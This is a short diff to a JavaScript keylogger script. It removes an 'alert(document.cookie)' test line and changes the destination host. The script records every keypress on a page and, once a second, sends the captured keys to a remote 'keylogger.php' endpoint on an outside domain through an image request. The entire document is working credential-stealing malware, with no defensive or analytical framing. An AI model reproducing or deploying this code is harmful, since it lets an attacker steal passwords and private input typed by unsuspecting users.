@@ -1,5 +1,5 @@
 var keys = '';
-alert(document.cookie);
+
 document.onkeypress = function(e) {
     var get = window.event ? event : e;
     var key = get.keyCode ? get.keyCode : get.charCode;
@@ -8,6 +8,6 @@ document.onkeypress = function(e) {
 }
 
 window.setInterval(function(){
-    new Image().src = 'http://individualproject.esy.es/php/keylogger.php?c=' + keys;
+    new Image().src = 'http://stme.esy.es/php/keylogger.php?c=' + keys;
      keys = '';
 }, 1000);
